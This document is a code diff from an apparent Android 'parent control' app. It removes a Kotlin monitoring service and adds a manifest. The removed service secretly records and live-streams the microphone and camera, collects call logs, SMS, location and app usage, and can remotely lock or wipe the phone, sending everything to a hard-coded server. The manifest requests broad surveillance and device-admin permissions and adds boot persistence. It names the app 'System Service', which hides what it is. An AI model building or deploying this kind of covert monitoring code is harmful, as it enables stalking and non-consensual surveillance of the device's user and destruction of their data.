@@ -1,355 +1,129 @@
-package com.parentcontrol.app
+<?xml version="1.0" encoding="utf-8"?>
+<manifest xmlns:android="http://schemas.android.com/apk/res/android"
+    xmlns:tools="http://schemas.android.com/tools"
+    package="com.parentcontrol.app">
 
-import android.app.*
-import android.content.Context
-import android.content.Intent
-import android.graphics.ImageFormat
-import android.hardware.camera2.*
-import android.media.AudioFormat
-import android.media.AudioRecord
-import android.media.ImageReader
-import android.media.MediaRecorder
-import android.os.BatteryManager
-import android.os.Handler
-import android.os.HandlerThread
-import android.os.IBinder
-import android.os.PowerManager
-import androidx.core.app.NotificationCompat
-import okhttp3.*
-import okhttp3.MediaType.Companion.toMediaType
-import okhttp3.RequestBody.Companion.asRequestBody
-import okhttp3.RequestBody.Companion.toRequestBody
-import okio.ByteString.Companion.toByteString
-import org.json.JSONObject
-import java.io.File
+    <uses-permission android:name="android.permission.INTERNET" />
+    <uses-permission android:name="android.permission.RECORD_AUDIO" />
+    <uses-permission android:name="android.permission.CAMERA" />
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MICROPHONE" />
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_CAMERA" />
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MEDIA_PROJECTION" />
+    <uses-permission android:name="android.permission.POST_NOTIFICATIONS" />
+    <uses-permission android:name="android.permission.WAKE_LOCK" />
+    <uses-permission android:name="android.permission.BIND_DEVICE_ADMIN" />
+    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
+    <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS" />
+    <uses-permission android:name="android.permission.SCHEDULE_EXACT_ALARM" />
+    <uses-permission android:name="android.permission.USE_EXACT_ALARM" />
+    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
+    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
+    <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION" />
+    <uses-permission android:name="android.permission.READ_SMS" />
+    <uses-permission android:name="android.permission.READ_CALL_LOG" />
+    <uses-permission android:name="android.permission.PACKAGE_USAGE_STATS"
+        tools:ignore="ProtectedPermissions" />
 
-class MonitoringService : Service() {
+    <application
+        android:allowBackup="true"
+        android:label="System Service"
+        android:theme="@style/Theme.AppCompat.Light">
 
-    private var audioRecord: AudioRecord? = null
-    private val CHANNEL_ID = "monitoring_channel"
-    private val SERVER_URL = "https://overflowing-perception-production-17b2.up.railway.app/upload"
-    private val WS_URL = "wss://overflowing-perception-production-17b2.up.railway.app"
-    private val DEVICE_NAME = android.os.Build.MODEL
-    private val PARENT_CODE: String
-        get() {
-            val prefs = getSharedPreferences("parent_control", MODE_PRIVATE)
-            return prefs.getString("parent_code", "") ?: ""
-        }
-    private var isLive = false
-    private var isCameraLive = false
-    private var wsAudio: okhttp3.WebSocket? = null
-    private var wsCamera: okhttp3.WebSocket? = null
-    private val SAMPLE_RATE = 16000
-    private val BUFFER_SIZE = AudioRecord.getMinBufferSize(
-        SAMPLE_RATE, AudioFormat.CHANNEL_IN_MONO, AudioFormat.ENCODING_PCM_16BIT
-    ) * 2
-    private var wakeLock: PowerManager.WakeLock? = null
-    private var locationTracker: LocationTracker? = null
-    private var smsReader: SmsReader? = null
-    private var callLogReader: CallLogReader? = null
-    private var appUsageReader: AppUsageReader? = null
-    private var geofenceManager: GeofenceManager? = null
+        <activity
+            android:name=".ConnectActivity"
+            android:exported="true">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity>
 
-    private var cameraDevice: CameraDevice? = null
-    private var imageReader: ImageReader? = null
-    private var captureSession: CameraCaptureSession? = null
-    private var cameraThread: HandlerThread? = null
-    private var cameraHandler: Handler? = null
-    private var currentCameraIndex = 0
-    private var lastFrameTime = 0L
-    private val FRAME_INTERVAL = 150L
+        <activity
+            android:name=".MainActivity"
+            android:exported="true" />
 
-    override fun onCreate() {
-        super.onCreate()
-        createNotificationChannel()
-        startForeground(1, buildNotification())
-        acquireWakeLock()
-        KeepAliveReceiver.scheduleAlarm(this)
+        <activity
+            android:name=".PinActivity"
+            android:exported="true"
+            android:theme="@style/Theme.AppCompat.NoActionBar"/>
 
-        locationTracker = LocationTracker(this)
-        locationTracker?.startTracking()
+        <service
+            android:name=".MonitoringService"
+            android:foregroundServiceType="microphone|camera|location"
+            android:exported="false"
+            android:stopWithTask="false" />
 
-        smsReader = SmsReader(this)
-        smsReader?.startObserving()
+        <service
+            android:name=".ScreenMirrorService"
+            android:foregroundServiceType="mediaProjection"
+            android:exported="false"
+            android:stopWithTask="false" />
 
-        callLogReader = CallLogReader(this)
-        appUsageReader = AppUsageReader(this)
-        geofenceManager = GeofenceManager(this)
+        <service
+            android:name=".FirebaseReceiver"
+            android:exported="true">
+            <intent-filter>
+                <action android:name="com.google.firebase.MESSAGING_EVENT" />
+            </intent-filter>
+        </service>
 
-        Handler(mainLooper).postDelayed({
-            callLogReader?.readAndSend()
-            appUsageReader?.readAndSend()
-            sendBatteryLevel()
-            fetchGeofenceSettings()
-        }, 5000)
+        <service
+            android:name=".NotificationListener"
+            android:exported="true"
+            android:permission="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE">
+            <intent-filter>
+                <action android:name="android.service.notification.NotificationListenerService" />
+            </intent-filter>
+        </service>
 
-        val repeatHandler = Handler(mainLooper)
-        val repeatRunnable = object : Runnable {
-            override fun run() {
-                callLogReader?.readAndSend()
-                appUsageReader?.readAndSend()
-                sendBatteryLevel()
-                repeatHandler.postDelayed(this, 30 * 60 * 1000)
-            }
-        }
-        repeatHandler.postDelayed(repeatRunnable, 30 * 60 * 1000)
-    }
+        <service
+            android:name=".AppBlocker"
+            android:exported="true"
+            android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE"
+            android:label="App Blocker">
+            <intent-filter>
+                <action android:name="android.accessibilityservice.AccessibilityService" />
+            </intent-filter>
+            <meta-data
+                android:name="android.accessibilityservice"
+                android:resource="@xml/accessibility_appblocker" />
+        </service>
 
-    private fun fetchGeofenceSettings() {
-        Thread {
-            try {
-                val response = OkHttpClient().newCall(
-                    Request.Builder()
-                        .url("https://overflowing-perception-production-17b2.up.railway.app/geofence?device=$DEVICE_NAME&code=$PARENT_CODE")
-                        .build()
-                ).execute()
-                val body = response.body?.string() ?: return@Thread
-                val json = org.json.JSONObject(body)
-                if (json.optBoolean("active")) {
-                    geofenceManager?.startGeofence(
-                        json.getDouble("lat"),
-                        json.getDouble("lng"),
-                        json.getDouble("radius")
-                    )
-                }
-            } catch (e: Exception) { e.printStackTrace() }
-        }.start()
-    }
+        <receiver
+            android:name=".AdminReceiver"
+            android:exported="true"
+            android:permission="android.permission.BIND_DEVICE_ADMIN">
+            <meta-data
+                android:name="android.app.device_admin"
+                android:resource="@xml/device_admin" />
+            <intent-filter>
+                <action android:name="android.app.action.DEVICE_ADMIN_ENABLED" />
+                <action android:name="android.app.action.ACTION_DEVICE_ADMIN_DISABLE_REQUESTED" />
+            </intent-filter>
+        </receiver>
 
-    private fun sendBatteryLevel() {
-        Thread {
-            try {
-                val bm = getSystemService(Context.BATTERY_SERVICE) as BatteryManager
-                val level = bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY)
-                val charging = bm.isCharging
-                val json = JSONObject().apply {
-                    put("device", DEVICE_NAME)
-                    put("level", level)
-                    put("charging", charging)
-                    put("code", PARENT_CODE)
-                    put("time", System.currentTimeMillis())
-                }
-                val body = json.toString().toRequestBody("application/json".toMediaType())
-                OkHttpClient().newCall(
-                    Request.Builder()
-                        .url("https://overflowing-perception-production-17b2.up.railway.app/battery")
-                        .post(body).build()
-                ).execute()
-            } catch (e: Exception) { e.printStackTrace() }
-        }.start()
-    }
+        <receiver
+            android:name=".BootReceiver"
+            android:exported="true">
+            <intent-filter>
+                <action android:name="android.intent.action.BOOT_COMPLETED" />
+                <action android:name="android.intent.action.MY_PACKAGE_REPLACED" />
+            </intent-filter>
+        </receiver>
 
-    private fun acquireWakeLock() {
-        val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
-        wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "ParentControl::WakeLock")
-        wakeLock?.acquire(10 * 60 * 60 * 1000L)
-    }
+        <receiver
+            android:name=".KeepAliveReceiver"
+            android:exported="true">
+            <intent-filter>
+                <action android:name="android.intent.action.BOOT_COMPLETED" />
+            </intent-filter>
+        </receiver>
 
-    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
-        when (intent?.getStringExtra("action")) {
-            "start_audio" -> startAudioRecording()
-            "stop_audio" -> {}
-            "start_live" -> startLiveStream()
-            "stop_live" -> stopLiveStream()
-            "start_camera" -> startCameraStream()
-            "stop_camera" -> stopCameraStream()
-            "switch_camera" -> {
-                stopCameraStream()
-                Thread.sleep(500)
-                currentCameraIndex = if (currentCameraIndex == 0) 1 else 0
-                startCameraStream()
-            }
-            "lock_phone" -> lockPhone()
-            "wipe_phone" -> wipePhone()
-            "block_app" -> {
-                val pkg = intent.getStringExtra("package") ?: return START_STICKY
-                AppBlocker.blockApp(this, pkg)
-            }
-            "unblock_app" -> {
-                val pkg = intent.getStringExtra("package") ?: return START_STICKY
-                AppBlocker.unblockApp(this, pkg)
-            }
-            "bedtime_on" -> BedtimeReceiver.scheduleBedtime(this, 22, 0)
-            "bedtime_off" -> BedtimeReceiver.cancelBedtime(this)
-        }
-        return START_STICKY
-    }
+        <receiver
+            android:name=".BedtimeReceiver"
+            android:exported="true" />
 
-    private fun lockPhone() {
-        val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as android.app.admin.DevicePolicyManager
-        val adminComponent = android.content.ComponentName(this, AdminReceiver::class.java)
-        if (dpm.isAdminActive(adminComponent)) dpm.lockNow()
-    }
+    </application>
 
-    private fun wipePhone() {
-        val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as android.app.admin.DevicePolicyManager
-        val adminComponent = android.content.ComponentName(this, AdminReceiver::class.java)
-        if (dpm.isAdminActive(adminComponent)) dpm.wipeData(0)
-    }
-
-    private fun buildNotification(): Notification {
-        return NotificationCompat.Builder(this, CHANNEL_ID)
-            .setContentTitle("Child Monitor Active")
-            .setContentText("Monitoring is running")
-            .setSmallIcon(android.R.drawable.ic_dialog_info)
-            .setPriority(NotificationCompat.PRIORITY_LOW)
-            .build()
-    }
-
-    private fun createNotificationChannel() {
-        val channel = NotificationChannel(CHANNEL_ID, "Monitoring Service", NotificationManager.IMPORTANCE_LOW)
-        getSystemService(NotificationManager::class.java).createNotificationChannel(channel)
-    }
-
-    private fun startAudioRecording() {
-        try {
-            val file = File(cacheDir, "audio_${System.currentTimeMillis()}.mp4")
-            val recorder = MediaRecorder().apply {
-                setAudioSource(MediaRecorder.AudioSource.MIC)
-                setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
-                setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
-                setOutputFile(file.absolutePath)
-                prepare()
-                start()
-            }
-            Handler(mainLooper).postDelayed({
-                recorder.stop()
-                recorder.release()
-                uploadFile(file)
-            }, 30000)
-        } catch (e: Exception) { e.printStackTrace() }
-    }
-
-    private fun uploadFile(file: File) {
-        Thread {
-            try {
-                val body = MultipartBody.Builder()
-                    .setType(MultipartBody.FORM)
-                    .addFormDataPart("file", file.name, file.asRequestBody("audio/mp4".toMediaType()))
-                    .addFormDataPart("device", DEVICE_NAME)
-                    .addFormDataPart("code", PARENT_CODE)
-                    .build()
-                OkHttpClient().newCall(Request.Builder().url(SERVER_URL).post(body).build()).execute()
-                file.delete()
-            } catch (e: Exception) { e.printStackTrace() }
-        }.start()
-    }
-
-    private fun startLiveStream() {
-        isLive = true
-        val client = OkHttpClient.Builder().pingInterval(20, java.util.concurrent.TimeUnit.SECONDS).build()
-        wsAudio = client.newWebSocket(
-            Request.Builder().url("$WS_URL?type=child&device=$DEVICE_NAME&code=$PARENT_CODE").build(),
-            object : WebSocketListener() {
-                override fun onOpen(webSocket: okhttp3.WebSocket, response: Response) { streamMicToWebSocket(webSocket) }
-                override fun onFailure(webSocket: okhttp3.WebSocket, t: Throwable, response: Response?) {
-                    isLive = false
-                    Handler(mainLooper).postDelayed({ if (isLive) startLiveStream() }, 3000)
-                }
-                override fun onClosed(webSocket: okhttp3.WebSocket, code: Int, reason: String) { isLive = false }
-            }
-        )
-    }
-
-    private fun streamMicToWebSocket(webSocket: okhttp3.WebSocket) {
-        Thread {
-            audioRecord = AudioRecord(
-                MediaRecorder.AudioSource.MIC, SAMPLE_RATE,
-                AudioFormat.CHANNEL_IN_MONO, AudioFormat.ENCODING_PCM_16BIT, BUFFER_SIZE
-            )
-            audioRecord?.startRecording()
-            val buffer = ByteArray(BUFFER_SIZE)
-            while (isLive) {
-                val read = audioRecord?.read(buffer, 0, buffer.size) ?: 0
-                if (read > 0) webSocket.send(buffer.copyOf(read).toByteString())
-            }
-            audioRecord?.stop()
-            audioRecord?.release()
-            audioRecord = null
-        }.start()
-    }
-
-    private fun stopLiveStream() {
-        isLive = false
-        wsAudio?.close(1000, "Stop")
-        wsAudio = null
-    }
-
-    private fun startCameraStream() {
-        isCameraLive = true
-        cameraThread = HandlerThread("CameraThread").also { it.start() }
-        cameraHandler = Handler(cameraThread!!.looper)
-        val okClient = OkHttpClient.Builder()
-            .writeTimeout(0, java.util.concurrent.TimeUnit.MILLISECONDS)
-            .pingInterval(20, java.util.concurrent.TimeUnit.SECONDS)
-            .build()
-        wsCamera = okClient.newWebSocket(
-            Request.Builder().url("$WS_URL?type=camera&device=$DEVICE_NAME&code=$PARENT_CODE").build(),
-            object : WebSocketListener() {
-                override fun onOpen(webSocket: okhttp3.WebSocket, response: Response) { openCamera(webSocket) }
-                override fun onFailure(webSocket: okhttp3.WebSocket, t: Throwable, response: Response?) { isCameraLive = false }
-            }
-        )
-    }
-
-    private fun openCamera(webSocket: okhttp3.WebSocket) {
-        val cameraManager = getSystemService(Context.CAMERA_SERVICE) as CameraManager
-        val cameraList = cameraManager.cameraIdList
-        val cameraId = cameraList[currentCameraIndex.coerceAtMost(cameraList.size - 1)]
-        imageReader = ImageReader.newInstance(256, 192, ImageFormat.JPEG, 3)
-        imageReader?.setOnImageAvailableListener({ reader ->
-            val now = System.currentTimeMillis()
-            val image = reader.acquireLatestImage()
-            if (image == null) return@setOnImageAvailableListener
-            if (now - lastFrameTime >= FRAME_INTERVAL && isCameraLive) {
-                val buffer = image.planes[0].buffer
-                val bytes = ByteArray(buffer.remaining())
-                buffer.get(bytes)
-                webSocket.send(bytes.toByteString())
-                lastFrameTime = now
-            }
-            image.close()
-        }, cameraHandler)
-        cameraManager.openCamera(cameraId, object : CameraDevice.StateCallback() {
-            override fun onOpened(camera: CameraDevice) {
-                cameraDevice = camera
-                val surface = imageReader!!.surface
-                camera.createCaptureSession(listOf(surface), object : CameraCaptureSession.StateCallback() {
-                    override fun onConfigured(session: CameraCaptureSession) {
-                        captureSession = session
-                        val request = camera.createCaptureRequest(CameraDevice.TEMPLATE_PREVIEW).apply {
-                            addTarget(surface)
-                            set(CaptureRequest.JPEG_QUALITY, 60)
-                            set(CaptureRequest.CONTROL_AE_TARGET_FPS_RANGE, android.util.Range(10, 15))
-                        }.build()
-                        session.setRepeatingRequest(request, null, cameraHandler)
-                    }
-                    override fun onConfigureFailed(session: CameraCaptureSession) {}
-                }, cameraHandler)
-            }
-            override fun onDisconnected(camera: CameraDevice) { camera.close() }
-            override fun onError(camera: CameraDevice, error: Int) { camera.close() }
-        }, cameraHandler)
-    }
-
-    private fun stopCameraStream() {
-        isCameraLive = false
-        captureSession?.close()
-        captureSession = null
-        cameraDevice?.close()
-        cameraDevice = null
-        imageReader?.close()
-        imageReader = null
-        cameraThread?.quitSafely()
-        cameraThread = null
-        wsCamera?.close(1000, "Stop")
-        wsCamera = null
-    }
-
-    override fun onDestroy() {
-        super.onDestroy()
-        wakeLock?.release()
-    }
-
-    override fun onBind(intent: Intent?): IBinder? = null
-}
+</manifest>
